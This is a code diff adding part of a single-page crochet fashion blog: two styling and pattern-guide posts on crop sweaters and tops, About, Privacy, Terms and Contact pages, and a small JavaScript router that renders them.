+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Handmade Wardrobe</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Modern Knitwear</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Color Block Style</span>
+</div>
+`
+            },
+            {
+                id: 'striped-pattern-drop-shoulder-crop-sweater',
+                title: 'Striped Pattern Drop Shoulder Crop Sweater',
+                date: 'May 22, 2026',
+                image: './assets/Striped Pattern Drop Shoulder Crop Sweater.png',
+                excerpt: `Meet your new favorite cozy statement piece: the Striped Pattern Drop Shoulder Crop Sweater! With its relaxed silhouette, cropped hemline, and eye-catching stripe transitions, it is the ultimate blend of comfort and style. 🌸\n\n• Effortless drop-shoulder fit flatters all body types seamlessly\n• Ideal for transitional layering from breezy mornings to cool nights\n\nSave for later! #DropShoulderCrochet #CrochetCropSweater #StripedSweater #CozyCrochet #ModernHandmade 🧶`,
+                content: `
+<p>The modern cropped silhouette combined with a relaxed drop shoulder is one of the most universally loved styles in contemporary knitwear. The Striped Pattern Drop Shoulder Crop Sweater delivers on every front: it is cozy without being bulky, stylish without being fussy, and endlessly adaptable to your personal wardrobe aesthetic. Perfect for crisp spring mornings, beach bonfires, and casual brunch outings, this design embodies relaxed elegance.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;color:#334155;line-height:1.7;">
+    <li>Drop shoulder construction simplifies armhole shaping while creating an on-trend slouchy drape.</li>
+    <li>Cropped length pairs exceptionally well with high-waisted jeans, skirts, and tailored trousers.</li>
+    <li>Bold horizontal stripes provide visual interest and creative color customization opportunities.</li>
+    <li>Ribbed hems and cuffs add polished structure and elastic recovery to the finished garment.</li>
+    <li>Ideal transitional sweater for spring, mild summer evenings, and early autumn layering.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why the Drop Shoulder Silhouette Works So Well</h2>
+<p>Unlike fitted set-in sleeves that require precise armhole curved decreases and sleeve cap mathematical calculations, a drop shoulder silhouette falls naturally past the shoulder point down onto the upper arm. This relaxed geometry creates a comfortable, non-restrictive fit that adapts gracefully across a wide spectrum of body proportions.</p>
+<p>The straight-edged construction also simplifies colorwork significantly. Since rows remain consistent across the chest and back panels, horizontal stripes stay crisp and even all the way from hem to shoulder line.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> When measuring your desired crop length, take measurements while seated as well as standing. Cropped garments naturally rise slightly when you sit or raise your arms, so adding an extra inch or two ensures optimal coverage and comfort.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Yarn Selection for Lightweight Warmth</h2>
+<p>To ensure your cropped sweater drapes beautifully without feeling heavy or stiff, choosing the right yarn blend is essential. Cotton-acrylic, bamboo-wool, or lightweight merino blends offer the ideal combination of thermal comfort, softness, and stitch resilience.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Creating Elastic Ribbing on Cuffs and Hems</h3>
+<p>To anchor the relaxed bodice and cuffs, working single crochet in the back loop only (SC-BLO) or alternating front and back post stitches produces springy, resilient ribbed trim that holds its shape through repeated wear and washing.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Seamless Stripe Joining Techniques</h4>
+<p>Using the standing stitch method when starting new color bands eliminates noticeable seam ridges, keeping the interior of the garment soft and comfortable against your skin.</p>
+
+<div style="background:#fff7ed;border:1px solid #fed7aa;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#9a3412;font-weight:700;padding-left:12px;border-left:4px solid #ea580c;">Quick Note</h3>
+  <p style="margin:0;color:#7c2d12;line-height:1.6;">Steam blocking your sweater panels prior to seaming relaxes the fiber stitches and evens out the edges, making the final assembly process with a mattress stitch fast, invisible, and deeply satisfying.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Style a Cropped Drop Shoulder Sweater</h2>
+<p>The cropped proportion makes this sweater exceptionally fun to style. By playing with silhouettes and proportions, you can craft looks that range from streetwear chic to cozy bohemian elegance.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Pair your cropped drop shoulder sweater over a slip dress or high-waisted satin midi skirt for an effortless textural contrast between chunky handcrafted knitwear and flowing fabric.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Casual Everyday Pairings</h3>
+<p>For an easy everyday outfit, style your sweater with vintage straight-leg jeans, clean white sneakers, and minimal gold hoop earrings for a timeless, effortless vibe.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;color:#334155;line-height:1.7;">
+    <li>Fit Profile: Relaxed, boxy, cropped length</li>
+    <li>Sleeve Style: Drop shoulder with tapered ribbed cuffs</li>
+    <li>Best Season: Spring, late summer evenings, fall transitions</li>
+    <li>Key Technique: Stripe colorwork and mattress stitch seaming</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+<p>The Striped Pattern Drop Shoulder Crop Sweater proves that handmade fashion can be trendy, ultra-comfortable, and wonderfully simple to make. Its flattering boxy fit and dynamic stripes will bring joyful color and effortless chic to your handmade wardrobe.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Crop Sweater</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Drop Shoulder</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Striped Crochet</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Cozy Knitwear</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Handmade Sweater</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Crochet Pattern</span>
+</div>
+`
+            },
+            {
+                id: 'womens-crop-top-handmade-crochet-style-guide',
+                title: "Women's Crop top",
+                date: 'June 11, 2026',
+                image: "./assets/Women's Crop top.png",
+                excerpt: `Embrace sun-drenched days in style with this chic Women's Crop Top! Handcrafted with clean modern lines, textured stitches, and a tailored silhouette, this top is an essential summer statement piece. 💛\n\n• Flattering tailored fit designed for effortless everyday wear\n• Lightweight, breathable stitches keep you cool and stylish all season\n\nSave for later! #WomensCropTop #CrochetCropTop #HandmadeFashion #SummerStyle #BohoChicTop 🧶`,
+                content: `
+<p>Modern handmade fashion has firmly embraced the crop top as an indispensable foundation for chic summer dressing. Tailored, breathable, and full of artisanal texture, the Women's Crochet Crop Top offers a fresh, contemporary aesthetic that seamlessly transitions from sunny morning markets to sunset beach strolls. With its clean lines and sculpted silhouette, it represents the very best of modern fiber craft.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;color:#334155;line-height:1.7;">
+    <li>Customizable cup shaping and bodice depth provide supportive, flattering contouring.</li>
+    <li>Dense yet flexible textured stitches ensure modesty and comfort without requiring lining.</li>
+    <li>Durable strap options offer both minimalist elegance and secure all-day wearability.</li>
+    <li>Natural fiber yarns like organic cotton, linen, and hemp provide maximum breathability.</li>
+    <li>Quick to crochet in just a few dedicated crafting sessions, making it a satisfying project.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Anatomy of a Well-Fitting Crochet Crop Top</h2>
+<p>A truly exceptional crop top balances structure, stretch, and visual charm. Unlike oversized garments where precise gauge is forgiving, a fitted crop top benefits immensely from deliberate stitch architecture.</p>
+<p>Using dense textured stitches like half double crochet in the third loop, spider stitch, or herringbone single crochet creates a sturdy fabric with minimal transparency. Strategic darting or decrease lines under the bust contour the garment to your natural curves, preventing gaping and ensuring a tailored silhouette that feels as good as it looks.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> When constructing fitted crochet bodices, remember that cotton yarn expands slightly with wear. Crafting the bodice with zero to slightly negative ease (0.5 to 1 inch smaller than your actual body measurement) ensures that it maintains its supportive, snug fit all day long.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Choosing the Perfect Colorway and Yarn Weight</h2>
+<p>The beauty of crafting your own crop top lies in total aesthetic autonomy. Earthy neutrals like terracotta, warm cream, sun-bleached linen, and sage green evoke a grounded bohemian spirit, while vibrant tones like lemon zest, lavender, and rich cobalt make a bold summer statement.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Strap Variations for Every Style</h3>
+<p>Depending on your personal comfort and styling preferences, you can customize your straps easily:</p>
+<ul style="margin:0 0 18px 20px;color:#334155;line-height:1.7;">
+  <li><strong>Delicate Tie Straps:</strong> Provide adjustable charm with playful bow accents on the shoulders.</li>
+  <li><strong>Wide Ribbed Straps:</strong> Offer superior support and effortlessly conceal bra straps.</li>
+  <li><strong>Criss-Cross Back Straps:</strong> Add festival-inspired flair and customizable back tension.</li>
+</ul>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Finishing the Hemline</h4>
+<p>A clean slip-stitch edge or a playful scallop border along the bottom hem adds that final bespoke touch that distinguishes handmade garments from fast fashion alternatives.</p>
+
+<div style="background:#fff7ed;border:1px solid #fed7aa;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#9a3412;font-weight:700;padding-left:12px;border-left:4px solid #ea580c;">Expert Insight</h3>
+  <p style="margin:0;color:#7c2d12;line-height:1.6;">For extra support in larger cup sizes, thread thin elastic thread through the bottom under-bust band or incorporate double-thickness cups for added peace of mind and enhanced comfort.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Styling Your Handmade Crop Top for Day and Night</h2>
+<p>Versatility is the hallmark of a great summer crop top. Here are inspiring ways to integrate this handmade piece into your regular rotation:</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Layer your crop top underneath an open oversized linen shirt with relaxed tailored shorts for an effortlessly chic Mediterranean summer vibe.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Evening Glamour</h3>
+<p>For an elevated evening look, pair your crop top with high-waisted silk wide-leg trousers, metallic statement earrings, and a sleek tailored blazer resting gently over your shoulders.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;color:#334155;line-height:1.7;">
+    <li>Style: Fitted modern crop top</li>
+    <li>Skill Level: Confident Beginner to Intermediate</li>
+    <li>Key Features: Supportive contour shaping, customizable straps, breathable textured fabric</li>
+    <li>Care: Gentle hand wash, reshape and lay flat to dry</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+<p>The Women's Crochet Crop Top is a celebratory staple that combines modern chic style with the timeless beauty of handcrafted fiber art. Easy to make and universally flattering to wear, it will instantly become your favorite sun-ready staple season after season.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Women's Crop Top</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Crochet Crop Top</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Summer Style</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Handmade Fashion</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Boho Chic</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Crochet Pattern</span>
+</div>
+`
+            }
+        ];
+
+        // Static Legal & Info Pages
+        const pages = {
+            'about': {
+                title: 'About Crochet Tops',
+                content: `
+                    <p>Welcome to <strong>Crochet Tops</strong>, your ultimate destination for handmade crochet inspiration, modern summer patterns, and wearable fiber art!</p>
+                    <p>Our passion is bringing the joy of mindful, handcrafted wardrobe creation to makers of all skill levels. From breezy festival halter tops to cozy drop-shoulder cropped sweaters, we believe that creating your own garments fosters creativity, sustainability, and personal style.</p>
+                    <p>Whether you are learning to read your very first pattern or seeking fresh styling inspiration for your latest handmade masterpiece, our community is here to spark your imagination.</p>
+                    <p>Thank you for stopping by and happy crafting!</p>
+                `
+            },
+            'privacy': {
+                title: 'Privacy Policy',
+                content: `
+                    <p><strong>Last updated: May 2026</strong></p>
+                    <p>At Crochet Tops, we are committed to respecting and protecting the privacy of our visitors. This Privacy Policy outlines the types of information we collect and how it is used.</p>
+                    
+                    <h3>Log Files</h3>
+                    <p>We follow a standard procedure of using log files. These files log visitors when they visit websites. The information collected includes IP addresses, browser types, Internet Service Providers (ISP), date/time stamps, referring/exit pages, and click data. This data is not linked to personally identifiable information and is used exclusively for analyzing site usage and administering the website.</p>
+
+                    <h3>Cookies and Web Beacons</h3>
+                    <p>Like most websites, Crochet Tops uses cookies to store information about visitors' preferences and page visits. This information optimizes user experience by customizing content according to browser type and settings.</p>
+
+                    <h3>Google AdSense and Third-Party Advertising</h3>
+                    <p>Third-party advertising partners and networks may use cookies, JavaScript, and web beacons within their advertisements appearing on our blog. They automatically receive your IP address when this happens.</p>
+                    <ul>
+                        <li>Third-party vendors, including Google, use cookies to serve ads based on prior visits to this and other websites.</li>
+                        <li>You may opt out of personalized advertising at any time by visiting <a href="https://www.google.com/settings/ads" target="_blank" rel="noopener noreferrer">Google Ads Settings</a> or <a href="https://www.aboutads.info/choices/" target="_blank" rel="noopener noreferrer">AboutAds.info</a>.</li>
+                    </ul>
+
+                    <h3>Pinterest and Social Platforms</h3>
+                    <p>We provide social sharing options such as Pinterest Save buttons. These third-party services may collect data subject to their respective privacy guidelines (such as the <a href="https://policy.pinterest.com/en/privacy-policy" target="_blank" rel="noopener noreferrer">Pinterest Privacy Policy</a>).</p>
+
+                    <h3>Children's Privacy</h3>
+                    <p>Protecting children online is paramount. Crochet Tops does not knowingly collect any personally identifiable information from children under the age of 13. If you believe your child has provided such information on our site, please contact us immediately for prompt deletion.</p>
+                `
+            },
+            'terms': {
+                title: 'Terms of Service',
+                content: `
+                    <p><strong>Effective Date: May 2026</strong></p>
+                    <h3>1. Acceptance of Terms</h3>
+                    <p>By accessing and using Crochet Tops, you agree to comply with and be bound by these Terms of Service.</p>
+                    
+                    <h3>2. Use of Content</h3>
+                    <p>All content, styling guides, pattern summaries, photography, and text provided on this site are intended for personal, non-commercial inspiration and education.</p>
+
+                    <h3>3. Intellectual Property</h3>
+                    <p>All written articles, styling advice, and layout designs are protected by international copyright laws. Reproduction, redistribution, or modification without written permission is strictly prohibited.</p>
+
+                    <h3>4. Disclaimer</h3>
+                    <p>All content is provided on an 'as is' basis. We make no warranties regarding accuracy or completeness of external links or pattern interpretations.</p>
+                `
+            },
+            'contact': {
+                title: 'Contact Us',
+                content: `
+                    <p>Have questions, pattern feedback, or collaboration ideas? We would love to hear from you!</p>
+                    <p><strong>Email:</strong> <a href="mailto:contact@crochettops-creator.github.io">contact@crochettops-creator.github.io</a></p>
+                    <p>We strive to reply to all thoughtful inquiries within 48 to 72 business hours.</p>
+                `
+            }
+        };
+
+        // Application Controller
+        const app = document.getElementById('app');
+        const blogUsername = "Crochet Tops Studio";
+        const avatarUrl = "./assets/blog-avatar.png";
+
+        // Render Home Page
+        function renderHome() {
+            updateNavActive('home');
+            let html = '';
+            posts.forEach(post => {
+                html += `
+                    <article class="post-card" onclick="navigate('post', '${post.id}')">
+                        <div class="post-header">
+                            <div class="author-box">
+                                <img class="author-avatar" src="${avatarUrl}" alt="Avatar" onerror="this.onerror=null; this.src='https://via.placeholder.com/42?text=CT'">
+                                <div>
+                                    <span class="author-name">${blogUsername}</span>
+                                    <span class="author-title">Artisan & Pattern Designer</span>
+                                </div>
+                            </div>
+                            <span class="category-chip">Pattern Guide</span>
+                        </div>
+                        <div class="post-image-container">
+                            <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/640x480?text=Image+Not+Found'">
+                        </div>
+                        <div class="post-content">
+                            <h2>${post.title}</h2>
+                            <p>${post.excerpt.replace(/\\n/g, '<br>')}</p>
+                        </div>
+                        <div class="post-footer">
+                            <span>🗓 ${post.date}</span>
+                            <div class="post-actions">
+                                <button class="read-btn" onclick="event.stopPropagation(); navigate('post', '${post.id}')">Read Guide →</button>
+                                <span class="save-heart" title="Save Idea">♥</span>
+                            </div>
+                        </div>
+                    </article>
+                `;
+            });
+            app.innerHTML = html;
+        }
+
+        // Render Static Page
+        function renderPage(pageId) {
+            updateNavActive(pageId);
+            const page = pages[pageId];
+
+            if (!page) {
+                app.innerHTML = `<p>Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Home</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Home</a>
+                <div class="single-post">
+                    <div class="post-content" style="padding-top: 35px; padding-bottom: 35px;">
+                        <h1>${page.title}</h1>
+                        ${page.content}
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0);
+        }
+
+        // Render Single Post
+        function renderPost(postId) {
+            updateNavActive(null);
+            const post = posts.find(p => p.id === postId);
+
+            if (!post) {
+                app.innerHTML = `<p>Post not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Home</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Home</a>
+                <article class="single-post">
+                    <div class="post-header">
+                        <div class="author-box">
+                            <img class="author-avatar" src="${avatarUrl}" alt="Avatar" onerror="this.onerror=null; this.src='https://via.placeholder.com/42?text=CT'">
+                            <div>
+                                <span class="author-name">${blogUsername}</span>
+                                <span class="author-title">Artisan & Pattern Designer</span>
+                            </div>
+                        </div>
+                        <span class="category-chip">Crochet Tops</span>
+                    </div>
+                    <div class="post-image-container">
+                        <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/640x480?text=Image+Not+Found'">
+                    </div>
+                    <div class="post-content">
+                        <h1>${post.title}</h1>
+                        ${post.content}
+                    </div>
+                    <div class="post-footer">
+                        <span>🗓 ${post.date}</span>
+                        <div class="post-actions">
+                            <span>Handcrafted with ♥ by Crochet Tops Studio</span>
+                        </div>
+                    </div>
+                </article>
+            `;
+            window.scrollTo(0, 0);
+        }
+
+        // Highlight active navbar link
+        function updateNavActive(activeId) {
+            document.querySelectorAll('.top-nav a').forEach(a => a.classList.remove('active'));
+            if (activeId) {
+                const activeEl = document.getElementById(`nav-${activeId}`);
+                if (activeEl) activeEl.classList.add('active');
+            }
+        }
+
+        // Navigation Router
+        function navigate(view, id = null) {
+            if (view === 'home') {
+                window.location.hash = '';
+                renderHome();
+            } else if (view === 'post') {
+                window.location.hash = id;
+                renderPost(id);
+            } else if (view === 'page') {
+                window.location.hash = id;
+                renderPage(id);
+            }
+        }
+
+        // Handle URL Hash Navigation
+        window.addEventListener('hashchange', () => {
+            const hash = window.location.hash.replace('#', '');
+            if (hash) {
+                if (pages[hash]) {
+                    renderPage(hash);
+                } else {
+                    renderPost(hash);
+                }
+            } else {
+                renderHome();
+            }
+        });
+
+        // Initialize App on Page Load
+        const initialHash = window.location.hash.replace('#', '');
+        if (initialHash) {
+            if (pages[initialHash]) {
+                renderPage(initialHash);
+            } else {
+                renderPost(initialHash);
+            }
+        } else {
+            renderHome();
+        }
+    </script>
+</body>
+
+</html>
